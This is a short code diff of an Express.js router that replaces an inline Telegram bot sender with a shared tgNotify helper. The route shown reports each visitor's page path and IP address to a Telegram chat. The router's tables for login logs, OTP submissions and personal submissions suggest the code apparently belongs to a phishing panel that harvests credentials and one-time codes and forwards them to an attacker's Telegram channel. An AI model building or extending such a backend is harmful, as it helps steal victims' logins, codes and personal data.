@@ -2,22 +2,9 @@ import { Router, type IRouter } from "express";
 import { db, pageVisitsTable, loginLogsTable, personalSubmissionsTable, otpSubmissionsTable, contactSubmissionsTable } from "@workspace/db";
 import { desc } from "drizzle-orm";
 import { z } from "zod";
+import { tgNotify } from "../lib/tg-notify";
 
 const router: IRouter = Router();
-
-const BOT_TOKEN = process.env["VITE_TELEGRAM_BOT_TOKEN"] ?? "";
-const CHAT_ID   = process.env["VITE_TELEGRAM_CHAT_ID"] ?? "";
-
-async function sendTelegramNotif(text: string) {
-  if (!BOT_TOKEN || !CHAT_ID) return;
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML" }),
-    });
-  } catch { /* best-effort */ }
-}
 
 const VisitBody = z.object({
   path: z.string().min(1),
@@ -43,7 +30,7 @@ router.post("/track/visit", async (req, res): Promise<void> => {
   }).catch(() => {});
 
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-  await sendTelegramNotif(
+  await tgNotify(
     `🌐 <b>Kunjungan Halaman</b>\n\n` +
     `📄 Path   : <code>${path}</code>\n` +
     `🌐 IP     : <code>${ip}</code>\n` +
